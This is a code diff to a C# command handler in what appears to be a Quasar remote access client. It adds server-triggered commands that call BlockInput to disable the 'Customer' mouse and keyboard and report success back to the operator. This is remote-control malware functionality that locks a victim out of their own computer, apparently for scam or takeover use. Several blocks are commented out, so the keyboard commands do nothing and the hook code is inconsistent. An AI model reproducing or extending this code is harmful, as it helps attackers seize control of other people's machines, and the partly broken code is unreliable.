@@ -11,22 +11,19 @@ using System.Security.AccessControl;
 using System.ServiceModel.Channels;
 using System.Text;
 using System.Threading;
+using System.Threading.Tasks;
 using System.Windows.Forms;
 
 namespace Quasar.Client.Messages
 {
     public class CustomCommandHandler : IMessageProcessor
     {
-        const uint TH32CS_SNAPTHREAD = 0x00000004;
-        const uint WM_NULL = 0x0000;
-
-
         private IntPtr _keyboardHookID = IntPtr.Zero;
         private IntPtr _mouseHookID = IntPtr.Zero;
 
         private Form _mainForm;
 
-        public delegate IntPtr keyboardHookProc(int nCode, IntPtr wParam, IntPtr lParam);
+        public delegate int keyboardHookProc(int code, int wParam, ref keyboardHookStruct lParam);
         public delegate IntPtr mouseHookProc(int nCode, IntPtr wParam, IntPtr lParam);
 
         const int WH_KEYBOARD_LL = 13;
@@ -36,15 +33,13 @@ namespace Quasar.Client.Messages
         const int WM_SYSKEYUP = 0x105; 
         const int WH_MOUSE_LL = 14;
         const int WM_MOUSEMOVE = 0x0200;
-
-        [StructLayout(LayoutKind.Sequential)]
-        private struct KBDLLHOOKSTRUCT
+        public struct keyboardHookStruct
         {
-            public uint vkCode;
-            public uint scanCode;
-            public uint flags;
-            public uint time;
-            public IntPtr dwExtraInfo;
+            public int vkCode;
+            public int scanCode;
+            public int flags;
+            public int time;
+            public int dwExtraInfo;
         }
 
         private const uint LLKHF_INJECTED = 0x10;
@@ -72,13 +67,16 @@ namespace Quasar.Client.Messages
         }
 
         [DllImport("user32.dll")]
+        private static extern bool BlockInput(bool fBlockIt);
+
+        [DllImport("user32.dll")]
         static extern IntPtr SetWindowsHookEx(int idHook, keyboardHookProc callback, IntPtr hInstance, uint threadId);
 
         [DllImport("user32.dll")]
         static extern bool UnhookWindowsHookEx(IntPtr hInstance);
 
         [DllImport("user32.dll")]
-        static extern IntPtr CallNextHookEx(IntPtr idHook, int nCode, IntPtr wParam, IntPtr lParam);
+        static extern int CallNextHookEx(IntPtr idHook, int nCode, int wParam, ref keyboardHookStruct lParam);
 
         [DllImport("user32.dll", SetLastError = true)]
         static extern bool GetUserObjectInformation(IntPtr hObj, int nIndex, StringBuilder pvInfo, int nLength, out int lpnLengthNeeded);
@@ -161,90 +159,104 @@ namespace Quasar.Client.Messages
             }
             else if (message.Type == CustomCommandType.DISABLE_CST_MOUSE)
             {
-                _mainForm.Invoke(new Action(() =>
-                {
-                    try
-                    {
-                        IntPtr hInstance = NativeMethods.LoadLibrary("user32.dll");
-                        _mouseHookID = SetWindowsHookEx(WH_MOUSE_LL, MouseHookCallback, hInstance, 0);
-                        if (_mouseHookID != IntPtr.Zero)
-                        {
-                            client.Send(new NotifyMessageToServer { Message = "Customer Mouse is Disabled!" });
-                        }
-                    }
-                    catch (Exception ex)
-                    {
-                        MessageBox.Show("Exception From Mouse Disable: " + ex.Message);
-                    }
-                }));
+                //Task.Run(() =>
+                //{
+                //_mainForm.Invoke(new Action(() =>
+                //{
+                //    try
+                //    {
+                //        IntPtr hInstance = NativeMethods.LoadLibrary("user32.dll");
+                //        //_mouseHookID = SetWindowsHookEx(WH_MOUSE_LL, MouseHookCallback, hInstance, 0);
+                //        if (_mouseHookID != IntPtr.Zero)
+                //        {
+                //            client.Send(new NotifyMessageToServer { Message = "Customer Mouse is Disabled!" });
+                //        }
+                //    }
+                //    catch (Exception ex)
+                //    {
+                //        client.Send(new NotifyMessageToServer { Message = "Exception From Mouse Disable: " + ex.Message });
+                //    }
+                //}));
+                BlockInput(true);
+                //});
             }
             else if (message.Type == CustomCommandType.ENABLE_CST_MOUSE)
             {
-                _mainForm.Invoke(new Action(() =>
-                {
-                    if (_mouseHookID != IntPtr.Zero)
-                    {
-                        UnhookWindowsHookEx(_mouseHookID);
-                        _mouseHookID = IntPtr.Zero;
-                        client.Send(new NotifyMessageToServer { Message = "Customer Mouse is Enabled!" });
-                    }
-                }));
+                //Task.Run(() =>
+                //{
+                //_mainForm.Invoke(new Action(() =>
+                //{
+                //    if (_mouseHookID != IntPtr.Zero)
+                //    {
+                //        UnhookWindowsHookEx(_mouseHookID);
+                //        _mouseHookID = IntPtr.Zero;
+                //        client.Send(new NotifyMessageToServer { Message = "Customer Mouse is Enabled!" });
+                //    }
+                //}));
+                //});
+                BlockInput(false);
             }
             else if (message.Type == CustomCommandType.DISABLE_CST_KEYBOARD)
             {
-                _mainForm.Invoke(new Action(() =>
-                {
-                    try
-                    {
-                        IntPtr hInstance = NativeMethods.LoadLibrary("user32.dll");
-                        _keyboardHookID = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardHookCallback, hInstance, 0);
-                        if (_keyboardHookID != IntPtr.Zero)
-                        {
-                            client.Send(new NotifyMessageToServer { Message = "Customer Keyboard is disabled!" });
-                        }
-                    }
-                    catch (Exception ex)
-                    {
-                        client.Send(new NotifyMessageToServer { Message = "Exception From Keyboard Diable: " + ex.Message });
-                    }
-                }));
+                //Task.Run(() =>
+                //{
+                    //_mainForm.Invoke(new Action(() =>
+                    //{
+                    //    try
+                    //    {
+                    //        IntPtr hInstance = NativeMethods.LoadLibrary("User32");
+                    //        _keyboardHookID = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardHookCallback, hInstance, 0);
+                    //        if (_keyboardHookID != IntPtr.Zero)
+                    //        {
+                    //            client.Send(new NotifyMessageToServer { Message = "Customer Keyboard is Disabled!" });
+                    //        }
+                    //    }
+                    //    catch (Exception ex)
+                    //    {
+                    //        client.Send(new NotifyMessageToServer { Message = "Exception From Keyboard Diable: " + ex.Message });
+                    //    }
+                    //}));
+                //});
             }
             else if (message.Type == CustomCommandType.ENABLE_CST_KEYBOARD)
             {
-                _mainForm.Invoke(new Action(() =>
-                {
-                    if (_keyboardHookID != IntPtr.Zero)
-                    {
-                        UnhookWindowsHookEx(_keyboardHookID);
-                        _keyboardHookID = IntPtr.Zero;
-                        client.Send(new NotifyMessageToServer { Message = "Customer Keyboard is Enabled!" });
-                    }
-                }));
+                //Task.Run(() =>
+                //{
+                    //_mainForm.Invoke(new Action(() =>
+                    //{
+                    //    if (_keyboardHookID != IntPtr.Zero)
+                    //    {
+                    //        UnhookWindowsHookEx(_keyboardHookID);
+                    //        _keyboardHookID = IntPtr.Zero;
+                    //        client.Send(new NotifyMessageToServer { Message = "Customer Keyboard is Enabled!" });
+                    //    }
+                    //}));
+                //});
             }
         }   
-        public IntPtr KeyboardHookCallback(int nCode, IntPtr wParam, IntPtr lParam)
+        public int KeyboardHookCallback(int nCode, int wParam, ref keyboardHookStruct lParam)
         {
-            if (nCode >= 0)
+            if (nCode > 0)
             {
-                KBDLLHOOKSTRUCT kbStruct = Marshal.PtrToStructure<KBDLLHOOKSTRUCT>(lParam);
-                if ((int)kbStruct.dwExtraInfo != 0x0AA)
-                {
-                    return (IntPtr)1; // Block only physical input for remote kernel-keyboard
-                }
+                //KBDLLHOOKSTRUCT kbStruct = Marshal.PtrToStructure<KBDLLHOOKSTRUCT>(lParam);
+                //if ((int)kbStruct.dwExtraInfo != 0x0AA)
+                //{
+                //    return (IntPtr)1; // Block only physical input for remote kernel-keyboard
+                //}
             }
-            return CallNextHookEx(_keyboardHookID, nCode, wParam, lParam);
+            return CallNextHookEx(_keyboardHookID, nCode, wParam, ref lParam);
         }
-        public IntPtr MouseHookCallback(int nCode, IntPtr wParam, IntPtr lParam)
-        {
-            if (nCode >= 0)
-            {
-                MSLLHOOKSTRUCT msStruct = Marshal.PtrToStructure<MSLLHOOKSTRUCT>(lParam);
-                if ((int)msStruct.dwExtraInfo != 0x0AB)
-                {
-                    return (IntPtr)1; // Block only physical input for remote kernel-mouse
-                }
-            }
-            return CallNextHookEx(_mouseHookID, nCode, wParam, lParam);
-        }
+        //public IntPtr MouseHookCallback(int nCode, IntPtr wParam, IntPtr lParam)
+        //{
+        //    if (nCode > 0)
+        //    {
+        //        MSLLHOOKSTRUCT msStruct = Marshal.PtrToStructure<MSLLHOOKSTRUCT>(lParam);
+        //        //if ((int)msStruct.dwExtraInfo != 0x0AB)
+        //        //{
+        //        //    return (IntPtr)1; // Block only physical input for remote kernel-mouse
+        //        //}
+        //    }
+        //    return CallNextHookEx(_mouseHookID, nCode, wParam, lParam);
+        //}
     }
 }
